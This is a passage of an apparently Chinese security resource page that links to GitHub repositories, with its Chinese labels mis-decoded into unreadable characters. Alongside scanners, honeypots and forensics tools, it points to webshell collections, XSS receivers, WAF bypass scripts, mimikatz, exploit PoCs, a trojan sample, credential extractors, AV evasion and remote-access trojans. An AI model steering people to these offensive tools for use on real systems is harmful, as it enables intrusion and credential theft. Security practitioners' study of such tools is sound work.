ç ´è§£:<br><a href="https://github.com/SECFORCE/SNMP-Brute">https://github.com/SECFORCE/SNMP-Brute</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>webshellå¤§åˆé›†ï¼š<br><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a><br>æ¸—é€ä»¥åŠwebæ”»å‡»è„šæœ¬ï¼š<br><a href="https://github.com/brianwrf/hackUtils">https://github.com/brianwrf/hackUtils</a><br>webæ¸—é€å°å·¥å…·å¤§åˆé›†ï¼š<br><a href="https://github.com/rootphantomer/hacktoolsfor_me">https://github.com/rootphantomer/hacktoolsfor_me</a><br>XSSæ•°æ®æ¥æ”¶å¹³å°ï¼š<br><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a><br>XSSä¸CSRFå·¥å…·ï¼š<br><a href="https://github.com/evilcos/xssor">https://github.com/evilcos/xssor</a><br>xsså¤šåŠŸèƒ½æ‰«æå™¨ï¼š<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>webæ¼æ´æ‰«æå™¨:<br><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a><br>WEBæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br>æ¸—é€å¸¸ç”¨å°å·¥å…·åŒ…ï¼š<br><a href="https://github.com/leonteale/pentestpackage">https://github.com/leonteale/pentestpackage</a><br>webç›®å½•æ‰«æå™¨:<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>webå‘å‘½ä»¤æ³¨å…¥æ£€æµ‹å·¥å…·ï¼š<br><a href="https://github.com/stasinopoulos/commix">https://github.com/stasinopoulos/commix</a><br>è‡ªåŠ¨åŒ–SQLæ³¨å…¥æ£€æŸ¥å·¥å…·ï¼š<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>SSLæ‰«æå™¨ï¼š<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>å®‰å…¨å·¥å…·é›†åˆï¼š<br><a href="https://github.com/codejanus/ToolSuite">https://github.com/codejanus/ToolSuite</a><br>apacheæ—¥å¿—åˆ†æå™¨ï¼š<br><a href="https://github.com/mthbernardes/ARTLAS">https://github.com/mthbernardes/ARTLAS</a><br>phpä»£ç å®¡è®¡å·¥å…·ï¼š<br><a href="https://github.com/pwnsdx/BadCode">https://github.com/pwnsdx/BadCode</a><br>webæŒ‡çº¹è¯†åˆ«æ‰«æï¼š<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>æ£€æŸ¥ç½‘ç«™æ¶æ„æ”»å‡»ï¼š<br><a href="https://github.com/ciscocsirt/malspider">https://github.com/ciscocsirt/malspider</a><br>wordpreesæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br>å›ºä»¶æ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/misterch0c/firminator_backend">https://github.com/misterch0c/firminator_backend</a><br>æ•°æ®åº“æ³¨å…¥å·¥å…·<br><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>Webä»£ç†ï¼š<br><a href="https://github.com/zt2/sqli-hunter">https://github.com/zt2/sqli-hunter</a><br>æ–°ç‰ˆä¸­å›½èœåˆ€ï¼š<br><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>gitæ³„éœ²åˆ©ç”¨EXPï¼š<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>æµè§ˆå™¨æ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a><br>è‡ªåŠ¨åŒ–ç»•è¿‡WAFè„šæœ¬ï¼š<br><a href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a><br>ä¸€æ¬¾å¼€æºWAFï¼š<br><a href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a><br>httpå‘½ä»¤è¡Œå®¢æˆ·ç«¯ï¼š<br><a href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a><br>æµè§ˆå™¨è°ƒè¯•åˆ©å™¨ï¼š<br><a href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a><br>DISCUZæ¼æ´æ‰«æå™¨ï¼š<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>è‡ªåŠ¨åŒ–ä»£ç å®¡è®¡å·¥å…·<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>æµè§ˆå™¨æ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a><br>tomcatè‡ªåŠ¨åé—¨éƒ¨ç½²ï¼š<br><a href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a><br>ç½‘ç»œç©ºé—´æŒ‡çº¹æ‰«æå™¨ï¼š<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>burpsuitä¹‹J2EEæ‰«ææ’ä»¶ï¼š<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p>
<h1 id="windowsåŸŸæ¸—é€å·¥å…·"><a href="#windowsåŸŸæ¸—é€å·¥å…·" class="headerlink" title="windowsåŸŸæ¸—é€å·¥å…·"></a>windowsåŸŸæ¸—é€å·¥å…·</h1><p>mimikatzæ˜æ–‡æ³¨å…¥ï¼š<br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>Powershellæ¸—é€åº“åˆé›†ï¼š<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>Powershell toolsåˆé›†ï¼š<br><a href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a><br>powershellçš„mimikittenz:<br><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a><br>åŸŸæ¸—é€æ•™ç¨‹:<br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h1><p>Webå‘Fuzzå·¥å…·<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
<h1 id="æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶"><a href="#æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶" class="headerlink" title="æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶"></a>æ¼æ´åˆ©ç”¨åŠæ”»å‡»æ¡†æ¶</h1><p>msfæ¡†æ¶ï¼š<br><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br>pocsscanæ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a><br>Pocsuiteæ”»å‡»æ¡†æ¶:<br><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a><br>Beebeetoæ”»å‡»æ¡†æ¶ï¼š<br><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a><br>æ¼æ´POC&amp;EXP:<br>ExploitDBå®˜æ–¹gitç‰ˆæœ¬:<br><a href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a><br>phpæ¼æ´ä»£ç åˆ†æï¼š<br><a href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a><br>CVE-2016-2107:<br><a href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a><br>CVE-2015-7547 POCï¼š<br><a href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a><br>JAVAååºåˆ—åŒ–POCç”Ÿæˆå·¥å…·:<br><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>JAVAååºåˆ—åŒ–EXP:<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a><br>Jenkins CommonCollections EXP:<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a><br>CVE-2015-2426 EXP (windowså†…æ ¸ææƒ):<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a><br>use docker to show web attack(phpæœ¬åœ°æ–‡ä»¶åŒ…å«ç»“åˆphpinfo<br>getshell ä»¥åŠssrfç»“åˆcurlçš„åˆ©ç”¨æ¼”ç¤º):<br><a href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a><br>php7ç¼“å­˜è¦†å†™æ¼æ´DemoåŠç›¸å…³å·¥å…·:<br><a href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a><br>XcodeGhostæœ¨é©¬æ ·æœ¬:<br><a href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h1 id="ä¸­é—´äººæ”»å‡»åŠé’“é±¼"><a href="#ä¸­é—´äººæ”»å‡»åŠé’“é±¼" class="headerlink" title="ä¸­é—´äººæ”»å‡»åŠé’“é±¼"></a>ä¸­é—´äººæ”»å‡»åŠé’“é±¼</h1><p>ä¸­é—´äººæ”»å‡»æ¡†æ¶:<br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a><br>Inject code, jam wifi, and spy on wifi users:<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>ä¸­é—´äººä»£ç†å·¥å…·:<br><a href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a><br>wifié’“é±¼:<br><a href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
<h1 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h1><p>å¯†ç ç ´è§£å·¥å…·:<br><a href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a><br>æœ¬åœ°å­˜å‚¨çš„å„ç±»å¯†ç æå–åˆ©å™¨:<br><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
<h1 id="äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·"><a href="#äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·" class="headerlink" title="äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·"></a>äºŒè¿›åˆ¶åŠä»£ç åˆ†æå·¥å…·</h1><p>äºŒè¿›åˆ¶åˆ†æå·¥å…·<br><a href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a><br>ç³»ç»Ÿæ‰«æå™¨<br><a href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a><br>rp:<br><a href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a><br>Windows Exploit Developmentå·¥å…·<br><a href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a><br>äºŒè¿›åˆ¶é™æ€åˆ†æå·¥å…·ï¼ˆpythonï¼‰:<br><a href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a><br>Python Exploit Development Assistance for GDB:<br><a href="https://github.com/longld/peda">https://github.com/longld/peda</a><br>å¯¹BillGates Linux Botnetç³»æœ¨é©¬æ´»åŠ¨çš„ç›‘æ§å·¥å…·<br><a href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a><br>æœ¨é©¬é…ç½®å‚æ•°æå–å·¥å…·:<br><a href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a><br>Shellphishç¼–å†™çš„äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼ˆCTFå‘ï¼‰:<br><a href="https://github.com/angr/angr">https://github.com/angr/angr</a><br>é’ˆå¯¹pythonçš„é™æ€ä»£ç åˆ†æå·¥å…·:<br><a href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a><br>ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„è„šæœ¬ï¼ˆshellï¼‰åˆ†æå·¥å…·ï¼Œç”¨æ¥ç»™å‡ºè­¦å‘Šå’Œå»ºè®®:<br><a href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a><br>åŸºäºASTå˜æ¢çš„ç®€æ˜“Javascriptåæ··æ·†è¾…åŠ©å·¥å…·:<br><a href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
<h1 id="EXPç¼–å†™æ¡†æ¶åŠå·¥å…·"><a href="#EXPç¼–å†™æ¡†æ¶åŠå·¥å…·" class="headerlink" title="EXPç¼–å†™æ¡†æ¶åŠå·¥å…·"></a>EXPç¼–å†™æ¡†æ¶åŠå·¥å…·</h1><p>äºŒè¿›åˆ¶EXPç¼–å†™å·¥å…·:<br><a href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a><br>CTF Pwn ç±»é¢˜ç›®è„šæœ¬ç¼–å†™æ¡†æ¶:<br><a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a><br>an easy-to-use io library for pwning development:<br><a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a><br>è·¨å¹³å°æ³¨å…¥å·¥å…·:<br><a href="https://github.com/frida/frida">https://github.com/frida/frida</a><br>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»EXPï¼š<br><a href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p>
<h1 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h1><p>éšå†™æ£€æµ‹å·¥å…·<br><a href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
<h1 id="å„ç±»å®‰å…¨èµ„æ–™"><a href="#å„ç±»å®‰å…¨èµ„æ–™" class="headerlink" title="å„ç±»å®‰å…¨èµ„æ–™:"></a>å„ç±»å®‰å…¨èµ„æ–™:</h1><p>data_hackingåˆé›†:<br><a href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a><br>mobile-security-wiki:<br><a href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a><br>ä¹¦ç±ã€Šreverse-engineering-for-beginnersã€‹:<br><a href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a><br>ä¸€äº›ä¿¡æ¯å®‰å…¨æ ‡å‡†åŠè®¾å¤‡é…ç½®:<br><a href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a><br>APTç›¸å…³ç¬”è®°:<br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a><br>Kconèµ„æ–™:<br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a><br>ã€ŠDO NOT FUCK WITH A HACKERã€‹:<br><a href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a><br>å„ç±»å®‰å…¨è„‘æ´å›¾ï¼š<br><a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a><br>ä¿¡æ¯å®‰å…¨æµç¨‹å›¾ï¼š<br><a href="https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428">https://github.com/SecWiki/sec-chart/tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p>
<h1 id="å„ç±»CTFèµ„æº"><a href="#å„ç±»CTFèµ„æº" class="headerlink" title="å„ç±»CTFèµ„æº"></a>å„ç±»CTFèµ„æº</h1><p>è¿‘å¹´ctf writeupå¤§å…¨:<br><a href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a><br>fbctfç«èµ›å¹³å°Demo:<br><a href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a><br>ctf Resources:<br><a href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a><br>ctfåŠé»‘å®¢èµ„æºåˆé›†:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctfå’Œå®‰å…¨å·¥å…·å¤§åˆé›†:<br><a href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a><br>ctfå‘ pythonå·¥å…·åŒ…<br><a href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
<h1 id="å„ç±»ç¼–ç¨‹èµ„æº"><a href="#å„ç±»ç¼–ç¨‹èµ„æº" class="headerlink" title="å„ç±»ç¼–ç¨‹èµ„æº"></a>å„ç±»ç¼–ç¨‹èµ„æº</h1><p> å¤§ç¤¼åŒ…ï¼ˆä»€ä¹ˆéƒ½æœ‰ï¼‰:<br><a href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a><br>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a><br>pythonèµ„æºå¤§å…¨:<br><a href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a><br>gitå­¦ä¹ èµ„æ–™:<br><a href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a><br>å®‰å“å¼€æºä»£ç è§£æ<br><a href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a><br>pythonæ¡†æ¶ï¼Œåº“ï¼Œèµ„æºå¤§åˆé›†:<br><a href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a><br>JS æ­£åˆ™è¡¨è¾¾å¼åº“ï¼ˆç”¨äºç®€åŒ–æ„é€ å¤æ‚çš„JSæ­£åˆ™è¡¨è¾¾å¼ï¼‰:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>python æ­£åˆ™è¡¨è¾¾å¼åº“ï¼ˆç”¨äºç®€åŒ–æ„é€ å¤æ‚çš„pythonæ­£åˆ™è¡¨è¾¾å¼ï¼‰:<br><a href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a><br>pythonä»»åŠ¡ç®¡ç†ä»¥åŠå‘½ä»¤æ‰§è¡Œåº“:<br><a href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a><br>python exeæ‰“åŒ…åº“:<br><a href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a><br>Veil-Evasionå…æ€é¡¹ç›®ï¼š<br><a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a><br>py3 çˆ¬è™«æ¡†æ¶:<br><a href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a><br>ä¸€ä¸ªæä¾›åº•å±‚æ¥å£æ•°æ®åŒ…ç¼–ç¨‹å’Œç½‘ç»œåè®®æ”¯æŒçš„pythonåº“:<br><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a><br>python requests åº“:<br><a href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a><br>python å®ç”¨å·¥å…·åˆé›†:<br><a href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a><br>pythonçˆ¬è™«ç³»ç»Ÿ:<br><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
<h1 id="ç¦åˆ©"><a href="#ç¦åˆ©" class="headerlink" title="ç¦åˆ©"></a>ç¦åˆ©</h1><p>å¾®ä¿¡è‡ªåŠ¨æŠ¢çº¢åŒ…åŠ¨æ€åº“<br><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a><br>å¾®ä¿¡æŠ¢çº¢åŒ…æ’ä»¶ï¼ˆå®‰å“ç‰ˆï¼‰<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a><br>hardsedç¥å™¨:<br><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
<h1 id="ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—"><a href="#ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—" class="headerlink" title="ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—"></a>ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—</h1><p>webç´¢å¼•åŠæ—¥å¿—æœç´¢å·¥å…·ï¼š<br><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a><br>å¼€æºæ—¥å¿—é‡‡é›†å™¨ï¼š<br><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a><br>æ‰«æCSç»“æ„çš„web debuger<br><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a><br>æ¢å¤sqliteæ•°æ®åº“åˆ é™¤æ³¨å†Œä¿¡æ¯ï¼š<br><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a><br>gpsæ¬ºéª—æ£€æµ‹å·¥å…·:<br><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a><br>åº”æ€¥å¤„ç½®å“åº”æ¡†æ¶:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a><br>webå®‰å…¨å¼€å‘æŒ‡å—:<br><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a><br>å„ä¸ªçŸ¥åå‚å•†æ¼æ´æµ‹è¯•æŠ¥å‘Šæ¨¡æ¿ï¼š<br><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a><br>linuxä¸‹æ¶æ„ä»£ç æ£€æµ‹åŒ…ï¼š<br><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a><br>æ“ä½œç³»ç»Ÿè¿è¡ŒæŒ‡æ ‡å¯è§†åŒ–æ¡†æ¶ï¼š<br><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a><br>æ¶æ„ä»£ç åˆ†æç³»ç»Ÿï¼š<br><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a><br>å®šæœŸæœç´¢åŠå­˜å‚¨webåº”ç”¨ï¼š<br><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a><br>äº‹ä»¶å“åº”æ¡†æ¶ï¼š<br><a href="https://github.com/google/grr">https://github.com/google/grr</a><br>ç»¼åˆä¸»æœºç›‘æ§æ£€æµ‹å¹³å°ï¼š<br><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a><br>åˆ†å¸ƒå¼å®æ—¶æ•°å­—å–è¯ç³»ç»Ÿï¼š<br><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a><br>Microsoft &amp; Unix æ–‡ä»¶ç³»ç»ŸåŠç¡¬ç›˜å–è¯å·¥å…·ï¼š<br><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p>
<h1 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h1><p>SSHèœœç½ï¼š<br><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a><br>èœœç½é›†åˆèµ„æºï¼š<br><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a><br>kippoè¿›é˜¶ç‰ˆèœœç½ï¼š<br><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a><br>SMTP èœœç½ï¼š<br><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a><br>webåº”ç”¨ç¨‹åºèœœç½ï¼š<br><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a><br>æ•°æ®åº“èœœç½ï¼š<br><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a><br>webèœœç½ï¼š<br><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p>
<h1 id="è¿œæ§"><a href="#è¿œæ§" class="headerlink" title="è¿œæ§"></a>è¿œæ§</h1><p>ç”¨gmailå……å½“C&amp;CæœåŠ¡å™¨çš„åé—¨<br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a><br>å¼€æºçš„è¿œæ§ï¼š<br><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a><br>c#è¿œæ§ï¼š<br><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>
<h1 id="å·¥å…·åˆé›†"><a href="#å·¥å…·åˆé›†" class="headerlink" title="å·¥å…·åˆé›†"></a>å·¥å…·åˆé›†</h1><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a></p>
<p>(NoSQLæ‰«æ/çˆ†ç ´å·¥å…·)<br><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a><br>(MySQLç›²æ³¨çˆ†ç ´å·¥å…·)<br><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a><br>(åŸºäºSQLMAPçš„ä¸»åŠ¨å’Œè¢«åŠ¨èµ„æºå‘ç°çš„æ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a><br>(ç”¨äºSQL Serverå®¡è®¡çš„powershellè„šæœ¬)<br><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a><br>(ç”¨äºhttp headerä¸­çš„æ—¶é—´ç›²æ³¨çˆ†ç ´å·¥å…·ï¼Œä»…é’ˆå¯¹MySQL / MariaDB)<br><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a><br>(Javaç¼–å†™çš„SQLæ³¨å…¥å·¥å…·)<br><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a><br>(åŸºäºæœç´¢å¼•æ“çš„æ‰¹é‡SQLæ³¨å…¥æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/s0md3v/sqlmate">https://github.com/s0md3v/sqlmate</a><br>(åœ¨sqlmapåŸºç¡€ä¸Šå¢åŠ äº†ç›®å½•æ‰«æï¼Œhashçˆ†ç ´ç­‰åŠŸèƒ½)<br><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a><br>(Mysysä»¥åŠMSSQLçˆ†ç ´è„±è£¤å·¥å…·)<br><a href="https://github.com/9tail123/wooscan">https://github.com/9tail123/wooscan</a><br>(æ‰¹é‡æŸ¥è¯¢ç½‘ç«™åœ¨ä¹Œäº‘æ˜¯å¦å­˜åœ¨å¿½ç•¥çš„sqlæ³¨å…¥æ¼æ´å¹¶è‡ªåŠ¨è°ƒç”¨sqlmapæµ‹è¯•)<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>(ä¸€ä¸ªç®€å•çš„HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬)<br><a href="https://github.com/ysrc/F-Scrack">https://github.com/ysrc/F-Scrack</a><br>(å¯¹å„ç±»æœåŠ¡è¿›è¡Œå¼±å£ä»¤æ£€æµ‹çš„è„šæœ¬)<br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a><br>(æ ¹æ®ç”¨æˆ·ä¹ æƒ¯ç”Ÿæˆå¼±å£ä»¤æ¢æµ‹å­—å…¸è„šæœ¬)<br><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a><br>(Goå†™çš„åç¨‹ç‰ˆçš„ssh \redis \ mongodbå¼±å£ä»¤ç ´è§£å·¥å…·)<br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a><br>(æš´åŠ›ç ´è§£å­—å…¸å»ºç«‹å·¥å…·)<br><a 